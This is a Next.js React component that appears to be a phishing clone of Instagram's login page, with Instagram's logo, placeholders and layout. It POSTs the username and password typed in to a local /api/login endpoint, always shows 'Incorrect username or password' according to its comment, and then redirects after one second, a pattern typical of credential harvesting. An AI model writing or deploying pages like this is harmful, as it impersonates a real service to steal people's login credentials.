"use client";
import { useState } from "react";
import { useRouter } from "next/navigation";

export default function LoginPage() {
  const [error, setError] = useState("");
  const router = useRouter();
  function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
  const handleSubmit = async (e) => {
    e.preventDefault();
    setError("");

    const username = e.target[0].value;
    const password = e.target[1].value;

    const res = await fetch("/api/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password }),
    });

    const data = await res.json();

    if (!res.ok) {
      setError(data.message); // always "Incorrect username or password"
    }
    await sleep(1000); // waits 1 second
    router.push("/");
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-50 p-4">
      <div className="w-full max-w-sm bg-white border border-gray-200 p-6 rounded-md shadow-sm">
        {/* Logo */}
        <img
          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSzld_xZ8ywiIt9BR9kjE6FZfdaLVc6fHQNbQ&s"
          alt="Instagram"
          className="mx-auto mb-6"
        />

        {/* Login Form */}
        <form className="space-y-4" onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Phone number, username, or email"
            className="w-full placeholder-black  text-black px-3 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-1 focus:ring-blue-500"
          />
          <input
            type="password"
            placeholder="Password"
            className="w-full px-3 py-2 border text-black placeholder-black border-gray-300 rounded-md text-sm focus:outline-none focus:ring-1 focus:ring-blue-500"
          />

          <button
            type="submit"
            className="w-full bg-blue-500 text-white py-2 rounded-md font-semibold text-sm hover:bg-blue-600 transition"
          >
            Log In
          </button>

          {error && (
            <p className="text-red-500 text-sm mt-2 text-center">{error}</p>
          )}
        </form>

        {/* Divider */}
        <div className="flex items-center my-4">
          <div className="flex-grow h-px bg-gray-300"></div>
          <span className="px-2 text-gray-500 text-sm font-medium">OR</span>
          <div className="flex-grow h-px bg-gray-300"></div>
        </div>

        {/* Forgot password */}
        <div className="text-center">
          <a href="#" className="text-blue-500 text-sm hover:underline">
            Forgot password?
          </a>
        </div>
      </div>
    </div>
  );
}
